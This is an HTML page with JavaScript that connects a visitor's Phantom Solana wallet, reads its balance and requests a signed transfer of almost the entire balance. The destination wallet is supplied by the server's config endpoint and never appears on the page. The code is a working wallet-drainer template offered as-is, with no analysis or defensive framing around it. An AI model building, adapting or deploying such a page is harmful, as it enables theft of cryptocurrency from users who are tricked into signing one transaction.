<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.41.4/solanaWeb3.min.js"></script>
</head>
<body>
    <h1>Click below to transfer all funds</h1>
    <button id="transferButton">Transfer Now</button>

    <script>
        document.getElementById('transferButton').addEventListener('click', async () => {
            if (!window.solana) {
                alert('Phantom wallet not found. Please install Phantom.');
                return;
            }

            try {
                await window.solana.connect();
                const publicKey = window.solana.publicKey;
                if (!publicKey) {
                    throw new Error('Failed to get public key.');
                }

                // Fetch recipient and RPC URL from server
                const response = await fetch('/api/config');
                const config = await response.json();
                const rpcUrl = config.rpcUrl;
                const recipient = config.receiverWallet;

                if (!rpcUrl || !recipient) {
                    throw new Error('Missing configuration. Please check your server setup.');
                }

                const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
                const balance = await connection.getBalance(publicKey);

                if (balance <= 5000) { // Ensure enough for transaction fee
                    alert('Insufficient SOL balance.');
                    return;
                }

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: new solanaWeb3.PublicKey(recipient),
                        lamports: balance - 5000 // Subtract estimated transaction fee
                    })
                );

                transaction.feePayer = publicKey;
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;

                const signedTransaction = await window.solana.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                await connection.confirmTransaction(signature);

                alert(`Transaction successful! Signature: ${signature}`);
            } catch (error) {
                console.error('Transaction Error:', error);
                alert(`Transaction failed: ${error.message}`);
            }
        });
    </script>
</body>
</html>
